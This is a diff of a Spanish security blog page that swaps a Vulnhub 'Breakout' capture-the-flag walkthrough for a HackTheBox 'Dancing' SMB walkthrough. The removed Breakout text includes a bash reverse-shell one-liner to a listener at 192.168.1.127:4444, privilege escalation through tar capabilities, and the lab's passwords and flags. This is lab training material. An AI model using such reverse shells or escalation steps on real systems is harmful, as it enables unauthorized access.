@@ -9,8 +9,8 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>Breakout - TheZombrex</title>
-<meta name="description" content="[Easy][Vulnhub] Writeup de Breakout.">
+<!-- begin _includes/seo.html --><title>Dancing - TheZombrex</title>
+<meta name="description" content="[StartingPoint][HackTheBox] Writeup de Dancing.">
 
 
   <meta name="author" content="TheZombrex">
@@ -22,20 +22,20 @@
 <meta property="og:type" content="article">
 <meta property="og:locale" content="es_ES">
 <meta property="og:site_name" content="TheZombrex">
-<meta property="og:title" content="Breakout">
-<meta property="og:url" content="http://localhost:4000/vulnhub/breakout/">
+<meta property="og:title" content="Dancing">
+<meta property="og:url" content="http://localhost:4000/hackthebox/dancing/">
 
 
-  <meta property="og:description" content="[Easy][Vulnhub] Writeup de Breakout.">
+  <meta property="og:description" content="[StartingPoint][HackTheBox] Writeup de Dancing.">
 
 
 
 
 
   <meta name="twitter:site" content="@TheZombrex">
-  <meta name="twitter:title" content="Breakout">
-  <meta name="twitter:description" content="[Easy][Vulnhub] Writeup de Breakout.">
-  <meta name="twitter:url" content="http://localhost:4000/vulnhub/breakout/">
+  <meta name="twitter:title" content="Dancing">
+  <meta name="twitter:description" content="[StartingPoint][HackTheBox] Writeup de Dancing.">
+  <meta name="twitter:url" content="http://localhost:4000/hackthebox/dancing/">
 
   
     <meta name="twitter:card" content="summary">
@@ -57,7 +57,7 @@
   
 
 
-<link rel="canonical" href="http://localhost:4000/vulnhub/breakout/">
+<link rel="canonical" href="http://localhost:4000/hackthebox/dancing/">
 
 
 
@@ -286,8 +286,8 @@
 
 
   <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
-    <meta itemprop="headline" content="Breakout">
-    <meta itemprop="description" content="[Easy][Vulnhub] Writeup de Breakout.">
+    <meta itemprop="headline" content="Dancing">
+    <meta itemprop="description" content="[StartingPoint][HackTheBox] Writeup de Dancing.">
     <meta itemprop="datePublished" content="2022-07-30T00:00:00+02:00">
     
 
@@ -295,7 +295,7 @@
       
         <header>
           <h1 id="page-title" class="page__title p-name" itemprop="headline">
-            <a href="http://localhost:4000/vulnhub/breakout/" class="u-url" itemprop="url">Breakout
+            <a href="http://localhost:4000/hackthebox/dancing/" class="u-url" itemprop="url">Dancing
 </a>
           </h1>
           
@@ -312,7 +312,7 @@
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          6 minuto(s) de lectura
+          5 minuto(s) de lectura
         
       </span>
     
@@ -324,153 +324,119 @@
 
       <section class="page__content e-content" itemprop="text">
         
-        <p>https://www.vulnhub.com/series/empire,507/</p>
+        <h1 id="preguntas">Preguntas</h1>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.1.0/24
+<p><strong>What does the 3-letter acronym SMB for?</strong></p>
+
+<p>server message block</p>
+
+<p><strong>What port does SMB use to operate at?</strong></p>
+
+<p>445</p>
+
+<p><strong>What network communication model does SMB use, architecturally speaking?</strong></p>
+
+<p>client_server model</p>
+
+<p><strong>What is the service name for port 445 that came up in our nmap scan?</strong></p>
+
+<p>microsoft-ds</p>
+
+<p><strong>What is the tool we use to connect SMB shares from our Linux distribution?</strong></p>
+
+<p>smbclient</p>
+
+<p><strong>What is the ‘flag’ or ‘switch’ we can use with the SMB tool to ‘list’ the contents of the share?</strong></p>
+
+<p>-l</p>
+
+<p><strong>What is the name of the share we are able to access in the end?</strong></p>
+
+<p>WorkShares</p>
+
+<p><strong>What is the command we can use within the SMB shell to download the files?</strong></p>
+
+<p>get</p>
+
+<h1 id="método-de-conexión">Método de conexión</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Smbclient –L IP</th>
+      <th>Nos dirá que grupos de trabajo existen en la máquina</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Smbclient \\IP\GRUPO</td>
+      <td>Nos conectará al grupo de trabajo</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>
+    <p>Comandos básicos</p>
+
+    <ul>
+      <li>
+        <p>Ls</p>
+      </li>
+      <li>
+        <p>Cd</p>
+      </li>
+      <li>
+        <p>Get</p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h1 id="proceso">Proceso</h1>
+
+<p>La máquina se resuelve de la siguiente manera:
+Escaneo nmap</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient –L IP
 </code></pre></div></div>
+<p>Nos mostrara los grupos de trabajo que existen en la máquina</p>
 
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/1.png" alt="image-center" class="align-center" /></p>
+<p><img src="http://localhost:4000/assets/images/htb/dancing/1.png" alt="image-center" class="align-center" /></p>
 
-<p>Saldrá la máquina breakout</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/2.png" alt="image-center" class="align-center" /></p>
-
-<p>Entrar al servidor web con la dirección <code class="language-plaintext highlighter-rouge">192.168.1.146</code>, saldrá la web por defecto de Apache</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/3.png" alt="image-center" class="align-center" /></p>
-
-<p>Dar click derecho e inspeccionar elemento y saldrá un mensaje encriptado</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/4.png" alt="image-center" class="align-center" /></p>
-
-<p>Usar el identificador de cifrado de la web decode.fr, dirá que es cifrado Brainfuck</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/5.png" alt="image-center" class="align-center" /></p>
-
-<p>Usar el descifrador Brainfuck</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/6.png" alt="image-center" class="align-center" /></p>
-
-<p>Tratar de intentar entrar al servidor web con otro de los puertos abiertos, en este caso el 20000</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/7.png" alt="image-center" class="align-center" /></p>
-
-<p>Dirá que es un servidor bajo SSL por lo que recomienda acceder con https en lugar de http, cambiamos y saldrá la advertencia de sitio inseguro</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/8.png" alt="image-center" class="align-center" /></p>
-
-<p>Pulsar en avanzado y en aceptar el riesgo y continuar</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/9.png" alt="image-center" class="align-center" /></p>
-
-<p>Saldrá un login para Usermin</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/10.png" alt="image-center" class="align-center" /></p>
-
-<p>Usar enum4linux para descubrir el usuario que se encuentra en el equipo</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/11.png" alt="image-center" class="align-center" /></p>
-
-<p>Saldrá el usuario cyber</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/12.png" alt="image-center" class="align-center" /></p>
-
-<p>Usar el usuario cyber y la contraseña descifrada anteriormente</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/13.png" alt="image-center" class="align-center" /></p>
-
-<p>Cargará el siguiente panel</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/14.png" alt="image-center" class="align-center" /></p>
-
-<p>En la parte inferior se encontrarán unos botones, uno de ellos permitirá abrir una shell</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/15.png" alt="image-center" class="align-center" /></p>
-
-<p>Entrará al directorio personal de cyber y con dicho usuario</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/16.png" alt="image-center" class="align-center" /></p>
-
-<p>Listar el contenido, mostrará un archivo llamado <code class="language-plaintext highlighter-rouge">user.txt</code></p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/17.png" alt="image-center" class="align-center" /></p>
-
-<p>Mostrará el flag del usuario</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/18.png" alt="image-center" class="align-center" /></p>
-
-<p>Usar el comando <code class="language-plaintext highlighter-rouge">getcap</code> con el archivo tar</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/19.png" alt="image-center" class="align-center" /></p>
-
-<p>Ir a <code class="language-plaintext highlighter-rouge">/var/backups</code> y mostrar el contenido</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/20.png" alt="image-center" class="align-center" /></p>
-
-<p>Volver al home de cyber y usar el archivo tar para comprimir el archivo <code class="language-plaintext highlighter-rouge">.old_pass.bak</code></p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/21.png" alt="image-center" class="align-center" /></p>
-
-<p>Descomprimir el archivo creado</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/22.png" alt="image-center" class="align-center" /></p>
-
-<p>Se creará un directorio llamado var, dentro de él otro llamado backups y dentro de este estará el archivo <code class="language-plaintext highlighter-rouge">.old_pass.bak</code> que ahora se podrá leer</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/23.png" alt="image-center" class="align-center" /></p>
-
-<p>Mostrará una contraseña para el usuario root</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/24.png" alt="image-center" class="align-center" /></p>
-
-<p>Al tratar de usar el comando su no lo permitirá</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/25.png" alt="image-center" class="align-center" /></p>
-
-<p>Hacer un reverse shell con el comando</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash –i  <span class="o">&gt;</span>&amp; /dev/tcp/192.168.1.127/4444 0&gt;&amp;1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="se">\\\\</span>IP<span class="se">\\</span>WorkShares
 </code></pre></div></div>
+<p>Nos conectará al grupo de trabajo en el que veremos dos directorios</p>
 
-<p>Y poner el puerto de escucha en 4444</p>
+<p><img src="http://localhost:4000/assets/images/htb/dancing/2.png" alt="image-center" class="align-center" /></p>
 
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/26.png" alt="image-center" class="align-center" /></p>
+<p>Comando <code class="language-plaintext highlighter-rouge">ls</code> Mostrará los directorios del grupo de trabajo</p>
 
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/27.png" alt="image-center" class="align-center" /></p>
+<p><img src="http://localhost:4000/assets/images/htb/dancing/3.png" alt="image-center" class="align-center" /></p>
 
-<p>Se abrirá un shell inverso aunque aún con el usuario cyber</p>
+<p>Comando <code class="language-plaintext highlighter-rouge">cd James.J\</code> Nos moverá al directorio <code class="language-plaintext highlighter-rouge">James.J\</code></p>
 
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/28.png" alt="image-center" class="align-center" /></p>
+<p><img src="http://localhost:4000/assets/images/htb/dancing/4.png" alt="image-center" class="align-center" /></p>
 
-<p>Hacer de nuevo un cat al archivo para poder copiar la contraseña</p>
+<p>Comando <code class="language-plaintext highlighter-rouge">ls</code> Mostrará el contenido del directorio</p>
 
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/29.png" alt="image-center" class="align-center" /></p>
+<p><img src="http://localhost:4000/assets/images/htb/dancing/5.png" alt="image-center" class="align-center" /></p>
 
-<p>Cambiar de usuario con su, cambiará al usuario root aunque sin mostrar texto, de todos modos se pueden escribir comandos</p>
+<p>Comando <code class="language-plaintext highlighter-rouge">get flag.txt</code> Nos descargará el archivo flag.txt</p>
 
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/30.png" alt="image-center" class="align-center" /></p>
+<p><img src="http://localhost:4000/assets/images/htb/dancing/6.png" alt="image-center" class="align-center" /></p>
 
-<p>Ir al directorio de root y mostrar el contenido</p>
+<p>Comando <code class="language-plaintext highlighter-rouge">exit</code> Salir del cliente de smb</p>
 
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/31.png" alt="image-center" class="align-center" /></p>
+<p>Comando <code class="language-plaintext highlighter-rouge">ls</code> Nos mostrará el contenido del home en nuestro equipo para comprobar que se ha descargado el archivo.</p>
 
-<p>Mostrará el flag del usuario root</p>
+<p><img src="http://localhost:4000/assets/images/htb/dancing/7.png" alt="image-center" class="align-center" /></p>
 
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/32.png" alt="image-center" class="align-center" /></p>
+<p>Comando <code class="language-plaintext highlighter-rouge">cat flag.txt</code> Mostrará el contenido del archivo flag.txt</p>
 
-<h2 id="usuarios-y-contraseñas">Usuarios y contraseñas</h2>
+<p><img src="http://localhost:4000/assets/images/htb/dancing/8.png" alt="image-center" class="align-center" /></p>
 
-<p>Cyber= .2uqPEfj3D&lt;P’a-3
-Root= Ts&amp;4&amp;YurgtRX(=~h</p>
-
-<h2 id="flags">Flags</h2>
-
-<p>Usuario:  3mp!r3{You_Manage_To_Break_To_My_Secure_Access}</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/33.png" alt="image-center" class="align-center" /></p>
-
-<p>Root: 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/34.png" alt="image-center" class="align-center" /></p>
+<p>Copiar el contenido del <code class="language-plaintext highlighter-rouge">flag.txt</code> y eliminar el archivo con el comando <code class="language-plaintext highlighter-rouge">rm flag.txt</code></p>
 
         
       </section>
@@ -487,9 +453,9 @@ Root= Ts&amp;4&amp;YurgtRX(=~h</p>
     <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Etiquetas: </strong>
     <span itemprop="keywords">
     
-      <a href="/tags/#easy" class="page__taxonomy-item p-category" rel="tag">easy</a><span class="sep">, </span>
+      <a href="/tags/#hackthebox" class="page__taxonomy-item p-category" rel="tag">hackthebox</a><span class="sep">, </span>
     
-      <a href="/tags/#vulnhub" class="page__taxonomy-item p-category" rel="tag">vulnhub</a><span class="sep">, </span>
+      <a href="/tags/#startingpoint" class="page__taxonomy-item p-category" rel="tag">StartingPoint</a><span class="sep">, </span>
     
       <a href="/tags/#writeup" class="page__taxonomy-item p-category" rel="tag">writeup</a>
     
@@ -508,7 +474,7 @@ Root= Ts&amp;4&amp;YurgtRX(=~h</p>
     <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categorías: </strong>
     <span itemprop="keywords">
     
-      <a href="/categories/#vulnhub" class="page__taxonomy-item p-category" rel="tag">vulnhub</a>
+      <a href="/categories/#hackthebox" class="page__taxonomy-item p-category" rel="tag">hackthebox</a>
     
     </span>
   </p>
@@ -525,22 +491,22 @@ Root= Ts&amp;4&amp;YurgtRX(=~h</p>
     <h4 class="page__share-title">Compartir en</h4>
   
 
-  <a href="https://twitter.com/intent/tweet?via=TheZombrex&text=Breakout%20http%3A%2F%2Flocalhost%3A4000%2Fvulnhub%2Fbreakout%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartir en Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?via=TheZombrex&text=Dancing%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2Fdancing%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartir en Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fvulnhub%2Fbreakout%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartir en Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2Fdancing%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartir en Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fvulnhub%2Fbreakout%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartir en LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2Fdancing%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartir en LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
       
   <nav class="pagination">
     
-      <a href="/hackthebox/appointment/" class="pagination--pager" title="Appointment
+      <a href="/hackthebox/crocodile/" class="pagination--pager" title="Crocodile
 ">Anterior</a>
     
     
-      <a href="/hackthebox/crocodile/" class="pagination--pager" title="Crocodile
+      <a href="/hackthebox/fawn/" class="pagination--pager" title="Fawn
 ">Siguiente</a>
     
   </nav>
@@ -800,8 +766,8 @@ Root= Ts&amp;4&amp;YurgtRX(=~h</p>
     
   <script>
     var disqus_config = function () {
-      this.page.url = "http://localhost:4000/vulnhub/breakout/";  /* Replace PAGE_URL with your page's canonical URL variable */
-      this.page.identifier = "/vulnhub/breakout"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+      this.page.url = "http://localhost:4000/hackthebox/dancing/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/hackthebox/dancing"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
     };
     (function() { /* DON'T EDIT BELOW THIS LINE */
       var d = document, s = d.createElement('script');
